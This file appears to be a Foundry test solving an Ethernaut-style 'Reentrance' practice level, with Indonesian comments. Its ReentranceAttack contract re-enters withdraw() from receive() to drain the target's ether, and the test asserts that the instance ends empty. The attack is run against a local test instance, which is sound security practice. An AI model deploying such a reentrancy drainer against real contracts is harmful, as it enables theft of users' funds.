// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Kontrak level 0.6: interaksi lewat interface + deployCode (lihat 02/05).
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

interface IReentranceFactory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public amount;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {
        amount = msg.value;
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        // withdraw() mengirim ETH DULU baru mengurangi saldo -> reenter
        // selama saldo instance masih cukup untuk satu penarikan lagi.
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}

contract ReentranceSolve is Test {
    IReentranceFactory factory;
    IReentrance instance;
    ReentranceAttack attacker;
    address player = address(0xBEEF);

    function setUp() public {
        factory = IReentranceFactory(deployCode("ReentranceFactory.sol:ReentranceFactory"));
        vm.deal(address(this), 1 ether);
        instance = IReentrance(factory.createInstance{value: 0.001 ether}(player));
        attacker = new ReentranceAttack(address(instance));
    }

    function testInit() public {
        assertEq(address(instance).balance, 0.001 ether);
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.deal(address(attacker), 0.001 ether);
        attacker.attack{value: 0.001 ether}();
        assertEq(address(instance).balance, 0);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
